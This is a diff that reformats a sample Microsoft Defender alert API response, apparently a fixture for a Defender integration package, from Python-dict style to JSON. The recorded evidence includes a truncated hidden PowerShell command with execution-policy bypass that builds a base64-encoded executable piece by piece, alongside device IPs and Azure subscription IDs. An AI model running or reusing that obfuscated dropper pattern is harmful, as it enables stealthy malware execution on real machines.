@@ -1,181 +1,181 @@
 {
-    'version': 2.0,
-    'success': True,
-    'reason': None,
-    'content': {
-      'General': {
-        '@odata.context': 'https://api.securitycenter.microsoft.com/api/$metadata#Alerts/$entity',
-        'id': 'da637792709228082931_312545642',
-        'incidentId': 39,
-        'investigationId': None,
-        'assignedTo': None,
-        'severity': 'Medium',
-        'status': 'New',
-        'classification': None,
-        'determination': None,
-        'investigationState': 'UnsupportedAlertType',
-        'detectionSource': 'WindowsDefenderAtp',
-        'detectorId': '7f1c3609-a3ff-40e2-995b-c01770161d68',
-        'category': 'Execution',
-        'threatFamilyName': None,
-        'title': 'Suspicious PowerShell command line',
-        'description': 'A suspicious PowerShell activity was observed on the machine. \nThis behavior may indicate that PowerShell was used during installation, exploration, or in some cases in lateral movement activities which are used by attackers to invoke modules, download external payloads, or get more information about the system. Attackers usually use PowerShell to bypass security protection mechanisms by executing their payload in memory without touching the disk and leaving any trace.',
-        'alertCreationTime': '2022-02-01T00:08:42.8083243Z',
-        'firstEventTime': '2022-01-31T23:46:32.8126235Z',
-        'lastEventTime': '2022-01-31T23:46:32.8126235Z',
-        'lastUpdateTime': '2022-02-01T21:05:48.8466667Z',
-        'resolvedTime': None,
-        'machineId': '93dfc3af285816182861e0a5252624420bcc0484',
-        'computerDnsName': 'windowsvmos2',
-        'rbacGroupName': None,
-        'aadTenantId': '50ad7d3e-b889-434d-802d-13b87c68047b',
-        'threatName': None,
-        'mitreTechniques': [
-          'T1059.001'
-        ],
-        'relatedUser': None,
-        'loggedOnUsers': [
-          
-        ],
-        'comments': [
-          
-        ],
-        'evidence': [
-          {
-            'entityType': 'Process',
-            'evidenceCreationTime': '2022-02-01T00:08:43.0766667Z',
-            'sha1': None,
-            'sha256': None,
-            'fileName': 'powershell.exe',
-            'filePath': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0',
-            'processId': 0,
-            'processCommandLine': '"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" -W Hidden -Exec Bypass -Command cd /;$fileBase64Prefix = \'\';$fileBase64Prefix= $fileBase64Prefix + \'TVq\';$fileBase64Prefix= $fileBase64Prefix + \'QAAM\';$fileBase64Prefix= $fileBase64Prefix + \'AAAAE\';$fileBase64Prefix= $fileBase64Prefix + \'AAAA\';$fileBase64Prefix= $fileBase64Prefix + \'/\';$fileBase64Prefix= $fileBase64Prefix + \'/\';$fileBase64Prefix= $fileBase64Prefix + \'8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAAZIYCAD/vl1oAAAAAAAAAAPAAIgALAjAAABQAAAAGAAAAAAAAAAAAAAAgAAAAAABAAQAAAAAgAAAAAgAABAAAAAAAAAAGAAAAAAAAAABgAAAAAgAAAAAAAAMAYIUAAEAAAAAAAABAAAAAAAAAAAAQAAAAAAAAIAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAABAAADMBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJDIAABwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\';$fileBase64Prefix= $fileBase64Prefix',
-            'processCreationTime': '2022-01-31T22:27:37.6696966Z',
-            'parentProcessId': None,
-            'parentProcessCreationTime': None,
-            'parentProcessFileName': None,
-            'parentProcessFilePath': None,
-            'ipAddress': None,
-            'url': None,
-            'registryKey': None,
-            'registryHive': None,
-            'registryValueType': None,
-            'registryValue': None,
-            'registryValueName': None,
-            'accountName': None,
-            'domainName': None,
-            'userSid': None,
-            'aadUserId': None,
-            'userPrincipalName': None,
-            'detectionStatus': 'Detected'
+    "version":2.0,
+    "success":true,
+    "reason":"None",
+    "content":{
+       "General":{
+          "@odata.context":"https://api.securitycenter.microsoft.com/api/$metadata#Alerts/$entity",
+          "id":"da637792709228082931_312545642",
+          "incidentId":39,
+          "investigationId":"None",
+          "assignedTo":"None",
+          "severity":"Medium",
+          "status":"New",
+          "classification":"None",
+          "determination":"None",
+          "investigationState":"UnsupportedAlertType",
+          "detectionSource":"WindowsDefenderAtp",
+          "detectorId":"7f1c3609-a3ff-40e2-995b-c01770161d68",
+          "category":"Execution",
+          "threatFamilyName":"None",
+          "title":"Suspicious PowerShell command line",
+          "description":"A suspicious PowerShell activity was observed on the machine. \nThis behavior may indicate that PowerShell was used during installation, exploration, or in some cases in lateral movement activities which are used by attackers to invoke modules, download external payloads, or get more information about the system. Attackers usually use PowerShell to bypass security protection mechanisms by executing their payload in memory without touching the disk and leaving any trace.",
+          "alertCreationTime":"2022-02-01T00:08:42.8083243Z",
+          "firstEventTime":"2022-01-31T23:46:32.8126235Z",
+          "lastEventTime":"2022-01-31T23:46:32.8126235Z",
+          "lastUpdateTime":"2022-02-01T21:05:48.8466667Z",
+          "resolvedTime":"None",
+          "machineId":"93dfc3af285816182861e0a5252624420bcc0484",
+          "computerDnsName":"windowsvmos2",
+          "rbacGroupName":"None",
+          "aadTenantId":"50ad7d3e-b889-434d-802d-13b87c68047b",
+          "threatName":"None",
+          "mitreTechniques":[
+             "T1059.001"
+          ],
+          "relatedUser":"None",
+          "loggedOnUsers":[
+             
+          ],
+          "comments":[
+             
+          ],
+          "evidence":[
+             {
+                "entityType":"Process",
+                "evidenceCreationTime":"2022-02-01T00:08:43.0766667Z",
+                "sha1":"None",
+                "sha256":"None",
+                "fileName":"powershell.exe",
+                "filePath":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0",
+                "processId":0,
+                "processCommandLine":"\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -W Hidden -Exec Bypass -Command cd /;$fileBase64Prefix = \\'\\';$fileBase64Prefix= $fileBase64Prefix + \\'TVq\\';$fileBase64Prefix= $fileBase64Prefix + \\'QAAM\\';$fileBase64Prefix= $fileBase64Prefix + \\'AAAAE\\';$fileBase64Prefix= $fileBase64Prefix + \\'AAAA\\';$fileBase64Prefix= $fileBase64Prefix + \\'/\\';$fileBase64Prefix= $fileBase64Prefix + \\'/\\';$fileBase64Prefix= $fileBase64Prefix + \\'8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAAZIYCAD/vl1oAAAAAAAAAAPAAIgALAjAAABQAAAAGAAAAAAAAAAAAAAAgAAAAAABAAQAAAAAgAAAAAgAABAAAAAAAAAAGAAAAAAAAAABgAAAAAgAAAAAAAAMAYIUAAEAAAAAAAABAAAAAAAAAAAAQAAAAAAAAIAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAABAAADMBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJDIAABwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\';$fileBase64Prefix= $fileBase64Prefix",
+                "processCreationTime":"2022-01-31T22:27:37.6696966Z",
+                "parentProcessId":"None",
+                "parentProcessCreationTime":"None",
+                "parentProcessFileName":"None",
+                "parentProcessFilePath":"None",
+                "ipAddress":"None",
+                "url":"None",
+                "registryKey":"None",
+                "registryHive":"None",
+                "registryValueType":"None",
+                "registryValue":"None",
+                "registryValueName":"None",
+                "accountName":"None",
+                "domainName":"None",
+                "userSid":"None",
+                "aadUserId":"None",
+                "userPrincipalName":"None",
+                "detectionStatus":"Detected"
+             }
+          ],
+          "domains":[
+             
+          ]
+       },
+       "Devices":{
+          "@odata.context":"https://api.securitycenter.microsoft.com/api/$metadata#Machines/$entity",
+          "id":"93dfc3af285816182861e0a5252624420bcc0484",
+          "computerDnsName":"windowsvmos2",
+          "firstSeen":"2022-01-31T23:04:08.319Z",
+          "lastSeen":"2022-07-25T20:05:50.4642241Z",
+          "osPlatform":"Windows10",
+          "osVersion":"None",
+          "osProcessor":"x64",
+          "version":"21H2",
+          "lastIpAddress":"10.0.0.6",
+          "lastExternalIpAddress":"13.90.197.104",
+          "agentVersion":"10.8040.19041.1806",
+          "osBuild":19044,
+          "healthStatus":"Active",
+          "deviceValue":"Normal",
+          "rbacGroupId":0,
+          "rbacGroupName":"None",
+          "riskScore":"High",
+          "exposureLevel":"Low",
+          "isAadJoined":false,
+          "aadDeviceId":"None",
+          "machineTags":[
+             
+          ],
+          "defenderAvStatus":"Updated",
+          "onboardingStatus":"Onboarded",
+          "osArchitecture":"64-bit",
+          "managedBy":"Unknown",
+          "managedByStatus":"Unknown",
+          "ipAddresses":[
+             {
+                "ipAddress":"10.0.0.6",
+                "macAddress":"00224830591E",
+                "type":"Ethernet",
+                "operationalStatus":"Up"
+             },
+             {
+                "ipAddress":"fe80::2d05:7c19:7f63:8827",
+                "macAddress":"00224830591E",
+                "type":"Ethernet",
+                "operationalStatus":"Up"
+             },
+             {
+                "ipAddress":"127.0.0.1",
+                "macAddress":"",
+                "type":"SoftwareLoopback",
+                "operationalStatus":"Up"
+             },
+             {
+                "ipAddress":"::1",
+                "macAddress":"",
+                "type":"SoftwareLoopback",
+                "operationalStatus":"Up"
+             }
+          ],
+          "vmMetadata":{
+             "vmId":"fe4b8cbd-759a-44c7-bf2b-d07bd1d1c542",
+             "cloudProvider":"Azure",
+             "resourceId":"/subscriptions/a4b7e24a-c7aa-4d84-8dae-89e99b336784/resourceGroups/DemoAssets/providers/Microsoft.Compute/virtualMachines/WindowsVMOS2",
+             "subscriptionId":"a4b7e24a-c7aa-4d84-8dae-89e99b336784"
           }
-        ],
-        'domains': [
-          
-        ]
-      },
-      'Devices': {
-        '@odata.context': 'https://api.securitycenter.microsoft.com/api/$metadata#Machines/$entity',
-        'id': '93dfc3af285816182861e0a5252624420bcc0484',
-        'computerDnsName': 'windowsvmos2',
-        'firstSeen': '2022-01-31T23:04:08.319Z',
-        'lastSeen': '2022-07-25T20:05:50.4642241Z',
-        'osPlatform': 'Windows10',
-        'osVersion': None,
-        'osProcessor': 'x64',
-        'version': '21H2',
-        'lastIpAddress': '10.0.0.6',
-        'lastExternalIpAddress': '13.90.197.104',
-        'agentVersion': '10.8040.19041.1806',
-        'osBuild': 19044,
-        'healthStatus': 'Active',
-        'deviceValue': 'Normal',
-        'rbacGroupId': 0,
-        'rbacGroupName': None,
-        'riskScore': 'High',
-        'exposureLevel': 'Low',
-        'isAadJoined': False,
-        'aadDeviceId': None,
-        'machineTags': [
-          
-        ],
-        'defenderAvStatus': 'Updated',
-        'onboardingStatus': 'Onboarded',
-        'osArchitecture': '64-bit',
-        'managedBy': 'Unknown',
-        'managedByStatus': 'Unknown',
-        'ipAddresses': [
-          {
-            'ipAddress': '10.0.0.6',
-            'macAddress': '00224830591E',
-            'type': 'Ethernet',
-            'operationalStatus': 'Up'
-          },
-          {
-            'ipAddress': 'fe80::2d05:7c19:7f63:8827',
-            'macAddress': '00224830591E',
-            'type': 'Ethernet',
-            'operationalStatus': 'Up'
-          },
-          {
-            'ipAddress': '127.0.0.1',
-            'macAddress': '',
-            'type': 'SoftwareLoopback',
-            'operationalStatus': 'Up'
-          },
-          {
-            'ipAddress': '::1',
-            'macAddress': '',
-            'type': 'SoftwareLoopback',
-            'operationalStatus': 'Up'
+       },
+       "Domains":{
+          "@odata.context":"https://api.securitycenter.microsoft.com/api/$metadata#Domains",
+          "value":[
+             
+          ]
+       },
+       "Files":{
+          "@odata.context":"https://api.securitycenter.microsoft.com/api/$metadata#Files",
+          "value":[
+             
+          ]
+       },
+       "IPs":{
+          "@odata.context":"https://api.securitycenter.microsoft.com/api/$metadata#Ips",
+          "value":[
+             
+          ]
+       },
+       "Users":{
+          "error":{
+             "code":"Forbidden",
+             "message":"The application does not have any of the required application permissions (User.Read.All) to access the resource.",
+             "target":"4416c3a8-64f6-4bcf-af36-bfd0e1f9808d"
           }
-        ],
-        'vmMetadata': {
-          'vmId': 'fe4b8cbd-759a-44c7-bf2b-d07bd1d1c542',
-          'cloudProvider': 'Azure',
-          'resourceId': '/subscriptions/a4b7e24a-c7aa-4d84-8dae-89e99b336784/resourceGroups/DemoAssets/providers/Microsoft.Compute/virtualMachines/WindowsVMOS2',
-          'subscriptionId': 'a4b7e24a-c7aa-4d84-8dae-89e99b336784'
-        }
-      },
-      'Domains': {
-        '@odata.context': 'https://api.securitycenter.microsoft.com/api/$metadata#Domains',
-        'value': [
-          
-        ]
-      },
-      'Files': {
-        '@odata.context': 'https://api.securitycenter.microsoft.com/api/$metadata#Files',
-        'value': [
-          
-        ]
-      },
-      'IPs': {
-        '@odata.context': 'https://api.securitycenter.microsoft.com/api/$metadata#Ips',
-        'value': [
-          
-        ]
-      },
-      'Users': {
-        'error': {
-          'code': 'Forbidden',
-          'message': 'The application does not have any of the required application permissions (User.Read.All) to access the resource.',
-          'target': '4416c3a8-64f6-4bcf-af36-bfd0e1f9808d'
-        }
-      }
+       }
     },
-    'raw': None,
-    'inputs': {
-      'defender_alert_info': [
-        'All'
-      ],
-      'defender_alert_id': 'da637792709228082931_312545642'
+    "raw":"None",
+    "inputs":{
+       "defender_alert_info":[
+          "All"
+       ],
+       "defender_alert_id":"da637792709228082931_312545642"
     },
-    'metrics': {
-      'version': '1.0',
-      'package': 'fn-microsoft-defender',
-      'package_version': '1.0.2',
-      'host': 'd1ce3546-4e5d-4925-9876-a14cb453f735-765669c8c9-4b45p',
-      'execution_time_ms': 3462,
-      'timestamp': '2022-07-26 18:53:31'
+    "metrics":{
+       "version":"1.0",
+       "package":"fn-microsoft-defender",
+       "package_version":"1.0.2",
+       "host":"d1ce3546-4e5d-4925-9876-a14cb453f735-765669c8c9-4b45p",
+       "execution_time_ms":3462,
+       "timestamp":"2022-07-26 18:53:31"
     }
-  }
+ }
